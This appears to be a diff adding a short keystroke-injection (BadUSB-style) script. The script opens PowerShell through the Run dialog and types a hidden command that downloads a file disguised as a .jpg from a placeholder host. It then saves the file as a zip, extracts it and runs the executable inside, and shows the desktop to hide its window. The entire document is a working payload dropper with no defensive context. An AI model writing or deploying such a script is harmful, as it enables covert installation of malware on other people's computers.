@@ -1,0 +1,12 @@
+DELAY 500
+GUI d
+DELAY 500
+GUI r
+DELAY 500
+ALTSTRING powershell.exe
+ENTER
+DELAY 2000
+ALTSTRING Start-Process -FilePath "powershell" -ArgumentList "/c cd $Env:temp;Invoke-WebRequest -Uri 'https://yoursite.com/zipfile.jpg' -OutFile 'zipfile.zip'; Expand-Archive zipfile.zip; Start-Process -FilePath '.\zipfile\your_executable.exe'; exit" -WindowStyle Hidden; exit
+ENTER
+DELAY 500
+GUI d
